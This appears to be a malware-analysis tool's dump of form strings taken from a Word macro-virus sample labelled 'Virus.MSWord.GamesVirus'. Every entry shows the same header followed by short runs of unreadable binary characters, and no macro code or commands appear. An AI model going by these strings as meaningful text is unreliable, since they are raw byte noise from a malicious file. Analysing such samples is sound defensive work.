-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NsyP��Y��q��>s�=ky<c�4cyO{�+Zq2Ri)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I BQ*RaW{�_{�g{�1JY2RQ0BY3Za3Za*Ra;Zi2Ri3Zi3Zi;Zi^syUkq!JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
18(BA1JQ'9I'9A(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %) 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Q.1Y-)Q%)Y%)Y.1I.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X��P��X��_{�5ky)Ja<cyEk�Fs�*Rq3Zq*Ri*Ra)Ja Ba BY)JY;Zy*RiVsyg{�_{�;Za;ZaLci;Zi;Za*Ra<cq<cq2RiDciLcq2Ra:Ra'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A BQ(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)( BQ)JY'98
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y%)Q.1Q-)Y%)Q-)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q-)Q.1Y%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y61i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)Y-)a%)a%)a.1a%)a%)a.1a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Fs�_{�W{�*Rq=k�3Zi4cq4cyX��3Zy*Rq+Zq)Ja'9Q(Ba)Ja;Zi<cy;ZiMkyg{�g{y;ZaMkqCZi;ZiMkq3Za<cq3Zi2Ri<cqCZi2Ri;Zi BY(BQ2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0'9Q1Ja'9I/9A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y.1Q.1Q0BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I79I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y%)Y&1a$!Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y8BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Fs�Ek�5k�*RqP��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y2RiO{�a��<c�3Zi2Ri<cyDcyEky;Zi<c�Mk�2Ra_{�Vs�Vs�2Ra;ZaMkq)JY)JYCZi BY3Zi1Ja3Zi;Zi1JY2Ra'9Q2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
('9I*Ra'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-) 790
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)(.10%) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)(5)0%)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q61Q8BQ-)Q-)Q-)Q-)Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q%)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a%)a%)a%)a%)a&1a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 $! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! Ek�Mk�+Zy!Ji<c�"Ri<cy5k�X��4c�!JY=k�Mky3ZqDcy3Zq4cqMk�MkqMkyg{�Nsy;ZiCZi)JYDci2Ra!JY0BI'9I BQ(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0(BQ9JY'9A&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AJI8BA-)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@BA@BA610	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)I%)I.1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I-)Q%)Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1(&1(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! EkyEk� Bi+Zy*Rq3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BYa��X��=k�3ZyEk�Dcy<c�<c�<c�Dcy<cq3Zi<cqNsyDcyg{�;Zao{y)JY)JY(BQ(BQ)JY)JQ BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A'9I(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A'9I(BA1JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
79A6107908BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)0nsidca[ZY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?98IJQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A.1Y.1I-)Q%)Y%)I%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a&1a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q*Rq!Ji BiDcqEk� Baa��Vs�#Zi"Ri3Zy<cy3Zq3ZqDcqEk�=ky=ky;Zq<cqMkyVs�<cqMkq;Za!JY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I)JY(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A1JQ BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9I(BQ(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9I(BI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0.1A%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IJQ8BI9JI?9A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10?9A���vsqmki	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dcaw{q.10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q.1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)Q.1Q.1Q.1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a-)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! .1(%)($! $! #
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! -)($! -)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba BY2Rq+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)IFs�!JY*Ri*Ri*Ri3Zy*Rq"Ra2Ri<cyNs�Eky)JY^syMkyEky]kq2RY3Zi)JY(BQ1Ja)JY)JQCZi(BQ(BQ'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8'9A&1A&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
